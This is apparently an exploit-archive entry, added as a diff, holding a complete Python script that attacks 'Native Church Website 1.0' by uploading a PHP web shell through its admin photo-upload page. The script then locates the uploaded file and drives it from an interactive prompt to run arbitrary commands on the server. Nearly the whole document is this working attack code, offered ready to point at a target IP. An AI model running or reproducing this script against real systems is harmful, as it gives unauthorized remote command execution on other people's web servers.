@@ -1,0 +1,91 @@
+id: 36105
+date: 04/14/2021
+title: Native Church Website 1.0 Shell Upload Exploit
+author: Richard Jones
+cves: 
+
+# Exploit Title: Native Church Website - Arbitrary File Upload (Authenticated)
+# Exploit Author: Richard Jones
+# Vendor Homepage: https://www.sourcecodester.com/php/11764/native-church-website-phpmysql.html
+# Version: 1.0
+# Tested on: Windows 10 build 19041 + xampp 3.2.4
+
+#/usr/bin/python3
+
+import requests
+import re
+from requests.models import ReadTimeoutError
+import sys
+
+s = requests.Session()
+
+TARGET = "192.168.1.207"  # <<< CHANGE ME
+
+UPLOADS_URL = f"http://{TARGET}/native/admin/save-photo.php"
+GALLERY_URL = f"http://{TARGET}/native/uploads/"
+
+def get(url):
+    r = s.get(url)
+    return r.text
+
+def banner():
+    ban = """ _______         __      __                 
+ \      \   ____/  \    /  \  ______  ______
+ /   |   \_/ ___\   \/\/   /  \____ \/  ___/
+/    |    \  \___\        /   |  |_> >___ \ 
+\____|__  /\___  >\__/\  / /\ |   __/____  >
+        \/     \/      \/  \/ |__|       \/ 
+
+    """
+    return ban
+
+def uploadShell():
+    data = (
+        ('file', ("file.php", "<?php system($_GET['c']);?>")),
+        ('caption', (None, 'simprevshell')),
+    )
+    r = s.post(UPLOADS_URL, files=data)
+    if r.status_code == 200:
+        return True
+    else:
+        return False
+
+def getLink(page):
+    matchObj = re.findall("href=\"(.*?).php\"", page)
+    return matchObj
+
+def testURL(url):
+    r = s.get(url)
+    return r.status_code
+
+def getUploadLink(uploads):
+    if len(NEW_UPLOADS) > 1:
+        for l in NEW_UPLOADS:
+            link = f"{GALLERY_URL}{l}.php"
+            if testURL(link) == 200:
+                return link
+
+uploadShell()
+
+# Get upload link.
+NEW_UPLOADS=getLink(get(GALLERY_URL))
+shellUrl = getUploadLink(NEW_UPLOADS)
+
+print("\033[34;1m" + banner() + "\033[0m")
+print("\033[37m" + "Created by: Richard Jones aka Ac1d" +"\033[0m")
+#Run webshell.
+while True:
+    print()
+    try:
+        cmd = input("\033[91mac1d\033[0m>")
+        if cmd == "exit":
+            sys.exit()
+        r = s.get(f"{shellUrl}?c={cmd}", verify=False)
+        if r.status_code == 200:
+            print(r.text)
+        else:
+            raise Exception
+    except KeyboardInterrupt:
+        sys.exit()
+
+#  0day.today [2023-03-24]  #
